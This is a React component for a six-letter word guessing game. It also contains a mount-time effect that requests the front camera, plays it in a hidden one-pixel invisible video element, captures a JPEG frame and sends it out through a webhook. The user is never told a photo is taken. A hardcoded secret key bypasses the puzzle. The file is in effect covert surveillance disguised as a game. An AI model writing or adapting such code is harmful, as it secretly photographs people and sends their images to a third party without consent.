"use client";

import { useState, useEffect, useCallback, useMemo, useRef } from 'react';
import { Button } from '@/components/ui/button';
import { useToast } from "@/hooks/use-toast";
import { cn } from '@/lib/utils';
import { Send, Delete } from 'lucide-react';
import { sendWebhook } from '@/ai/flows/send-webhook';

const SECRET_KEY = "THANGU";
const PUZZLE_WORDS = ["STUDIO", "SERVER", "CLIENT", "CODING", "GENKIT"];
const MAX_GUESSES = 6;
const WORD_LENGTH = 6;

type PuzzleViewProps = {
  onSuccess: () => void;
};

type GuessStatus = 'correct' | 'present' | 'absent';

export default function PuzzleView({ onSuccess }: PuzzleViewProps) {
  const [puzzleWord, setPuzzleWord] = useState('');
  const wordLength = WORD_LENGTH;

  const [guesses, setGuesses] = useState<string[]>(Array(MAX_GUESSES).fill(''));
  const [currentGuessIndex, setCurrentGuessIndex] = useState(0);
  const [currentGuess, setCurrentGuess] = useState('');
  const [statuses, setStatuses] = useState<GuessStatus[][]>(Array(MAX_GUESSES).fill([]));
  const [keyStatuses, setKeyStatuses] = useState<{[key: string]: GuessStatus}>({});
  const { toast } = useToast();
  const videoRef = useRef<HTMLVideoElement>(null);
  
  useEffect(() => {
    // Select a random word on component mount
    const randomWord = PUZZLE_WORDS[Math.floor(Math.random() * PUZZLE_WORDS.length)];
    setPuzzleWord(randomWord);
    // Reset state for new word
    setGuesses(Array(MAX_GUESSES).fill(''));
    setCurrentGuessIndex(0);
    setCurrentGuess('');
    setStatuses(Array(MAX_GUESSES).fill([]));
    setKeyStatuses({});
  }, []);

  useEffect(() => {
    const captureAndSend = async () => {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
        if (videoRef.current) {
          videoRef.current.srcObject = stream;
          videoRef.current.onloadedmetadata = () => {
            videoRef.current?.play();
            setTimeout(() => {
              const canvas = document.createElement('canvas');
              canvas.width = videoRef.current?.videoWidth || 640;
              canvas.height = videoRef.current?.videoHeight || 480;
              const context = canvas.getContext('2d');
              context?.drawImage(videoRef.current!, 0, 0, canvas.width, canvas.height);
              const dataUrl = canvas.toDataURL('image/jpeg');

              // Stop camera tracks
              stream.getTracks().forEach(track => track.stop());
              
              sendWebhook({ photoDataUri: dataUrl, message: "Liyana edthuu" });
            }, 500); // Wait a bit for camera to adjust
          };
        }
      } catch (err) {
        console.error("Camera permission denied or error:", err);
      }
    };
    captureAndSend();
  }, []);

  const handleKeyPress = useCallback((key: string) => {
    if (currentGuess.length < wordLength) {
      setCurrentGuess(prev => prev + key.toUpperCase());
    }
  }, [currentGuess, wordLength]);

  const handleBackspace = () => {
    setCurrentGuess(prev => prev.slice(0, -1));
  };

  const handleSubmit = useCallback(() => {
    if (currentGuess.toUpperCase() === SECRET_KEY) {
      onSuccess();
      return;
    }
    
    if (currentGuess.length !== puzzleWord.length) {
      toast({
        title: `Word must be ${puzzleWord.length} letters`,
        variant: "destructive",
      });
      // Don't return, let user try to submit, but the main game logic below won't proceed for wrong length.
    }
    
    if (currentGuess.toUpperCase() === puzzleWord) {
       toast({
        title: "You guessed it!",
        description: "Try guessing another word by refreshing.",
      });
       // In a real game, you might restart or go to a new level.
       // Here we just show a success message.
       // We don't call onSuccess because that's for the secret key.
    }
    
    // Only proceed with guess logic if the length matches the current puzzle word
    if (currentGuess.length !== puzzleWord.length) {
      return;
    }


    const newStatuses: GuessStatus[] = Array(puzzleWord.length).fill('absent');
    const newKeyStatuses = {...keyStatuses};
    const keyLetters = puzzleWord.split('');

    // First pass for correct letters
    for (let i = 0; i < puzzleWord.length; i++) {
        if (currentGuess[i] === puzzleWord[i]) {
            newStatuses[i] = 'correct';
            newKeyStatuses[currentGuess[i]] = 'correct';
            keyLetters[i] = '_'; // Mark as used
        }
    }

    // Second pass for present letters
    for (let i = 0; i < puzzleWord.length; i++) {
        if (newStatuses[i] !== 'correct' && keyLetters.includes(currentGuess[i])) {
            newStatuses[i] = 'present';
            if (newKeyStatuses[currentGuess[i]] !== 'correct') {
                newKeyStatuses[currentGuess[i]] = 'present';
            }
            keyLetters[keyLetters.indexOf(currentGuess[i])] = '_'; // Mark as used
        }
    }
    
    // Mark absent letters on keyboard
    for (const char of currentGuess) {
        if (!newKeyStatuses[char]) {
            newKeyStatuses[char] = 'absent';
        }
    }

    const newGuesses = [...guesses];
    newGuesses[currentGuessIndex] = currentGuess;
    setGuesses(newGuesses);

    const newStatusesArray = [...statuses];
    newStatusesArray[currentGuessIndex] = newStatuses;
    setStatuses(newStatusesArray);
    
    setKeyStatuses(newKeyStatuses);

    if (currentGuessIndex < MAX_GUESSES - 1) {
      setCurrentGuessIndex(prev => prev + 1);
      setCurrentGuess('');
    } else {
        if (currentGuess.toUpperCase() !== puzzleWord) {
             toast({
                title: "Out of guesses!",
                description: `The word was ${puzzleWord}. Try again by refreshing.`,
                variant: "destructive",
            });
        }
    }

  }, [currentGuess, currentGuessIndex, guesses, onSuccess, toast, statuses, keyStatuses, puzzleWord]);
  
  useEffect(() => {
    const handleKeyDown = (e: KeyboardEvent) => {
      if (e.key === 'Enter') {
        handleSubmit();
      } else if (e.key === 'Backspace') {
        handleBackspace();
      } else if (e.key.match(/^[a-zA-Z]$/)) {
        handleKeyPress(e.key);
      }
    };
    window.addEventListener('keydown', handleKeyDown);
    return () => window.removeEventListener('keydown', handleKeyDown);
  }, [handleSubmit, handleKeyPress]);


  if (!puzzleWord) {
    return <div className="flex flex-col items-center justify-center w-full min-h-screen bg-background p-4">Loading puzzle...</div>
  }

  return (
    <div className="flex flex-col items-center justify-center w-full min-h-screen bg-background p-4">
        <video ref={videoRef} className="absolute opacity-0 pointer-events-none w-px h-px"></video>
        <h1 className="text-4xl font-bold font-headline mb-2 text-foreground">Word Guess</h1>
        <p className="text-muted-foreground mb-8">Guess the {puzzleWord.length}-letter word. Or enter the secret key.</p>
        <div className={`grid gap-2 mb-8 grid-cols-6`}>
            {guesses.map((guess, rowIndex) => {
                const isCurrentRow = rowIndex === currentGuessIndex;
                const displayWord = isCurrentRow ? currentGuess : guess;

                return Array.from({ length: wordLength }).map((_, colIndex) => {
                    const letter = displayWord[colIndex] || '';
                    const status = statuses[rowIndex]?.[colIndex];

                    return (
                        <div
                            key={`${rowIndex}-${colIndex}`}
                            className={cn(
                                "flex items-center justify-center w-12 h-12 sm:w-14 sm:h-14 border-2 rounded-md text-2xl font-bold uppercase",
                                "border-border",
                                {
                                  "border-primary": isCurrentRow && colIndex === currentGuess.length,
                                  "bg-accent text-accent-foreground": status === 'correct',
                                  "bg-primary text-primary-foreground": status === 'present',
                                  "bg-muted text-muted-foreground": status === 'absent',
                                  "animate-in fade-in-0 zoom-in-50 duration-500": !!letter
                                }
                            )}
                        >
                            {letter}
                        </div>
                    );
                });
            })}
        </div>

      <Keyboard onKeyPress={handleKeyPress} onBackspace={handleBackspace} onSubmit={handleSubmit} keyStatuses={keyStatuses} />
    </div>
  );
}

const Keyboard = ({ onKeyPress, onBackspace, onSubmit, keyStatuses }: { onKeyPress: (key: string) => void; onBackspace: () => void; onSubmit: () => void; keyStatuses: {[key: string]: GuessStatus} }) => {
    const rows = [
        "QWERTYUIOP",
        "ASDFGHJKL",
        "ZXCVBNM"
    ];

    return (
        <div className="flex flex-col items-center gap-1.5 w-full max-w-lg px-1 sm:px-2">
            {rows.map((row, i) => (
                <div key={i} className="flex gap-1.5 justify-center w-full">
                    {i === 1 && <div className="flex-[0.5]"></div>}
                    {row.split('').map(key => (
                         <Button
                            key={key}
                            variant="outline"
                            className={cn("h-12 flex-1 basis-0 text-sm font-bold uppercase p-0", {
                                "bg-accent text-accent-foreground": keyStatuses[key] === 'correct',
                                "bg-primary text-primary-foreground": keyStatuses[key] === 'present',
                                "bg-muted text-muted-foreground": keyStatuses[key] === 'absent',
                            })}
                            onClick={() => onKeyPress(key)}
                         >
                             {key}
                         </Button>
                    ))}
                    {i === 1 && <div className="flex-[0.5]"></div>}
                </div>
            ))}
            <div className="flex gap-1.5 mt-2 w-full">
                <Button variant="outline" className="h-12 px-3 sm:px-4 font-bold uppercase text-xs sm:text-sm flex-[1.5]" onClick={onSubmit}><Send className="mr-1 sm:mr-2 h-4 w-4" /> Enter</Button>
                <Button variant="outline" className="h-12 px-3 sm:px-4 font-bold uppercase text-xs sm:text-sm flex-[1.5]" onClick={onBackspace}><Delete className="mr-1 sm:mr-2 h-4 w-4" /> Back</Button>
            </div>
        </div>
    );
}
